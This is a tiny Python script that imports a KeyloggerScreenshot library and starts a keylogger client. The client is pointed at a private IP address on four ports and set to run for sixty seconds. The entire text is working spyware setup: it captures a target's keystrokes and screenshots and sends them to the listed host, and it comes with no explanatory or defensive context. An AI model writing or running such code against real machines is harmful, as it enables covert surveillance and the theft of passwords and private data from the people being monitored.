import KeyloggerScreenshot as ks

ip = '192.168.0.75'
key_client = ks.KeyloggerTarget(ip, 4692, ip, 7689, ip, 6371, ip, 8436, duration_in_seconds=60) 
key_client.start()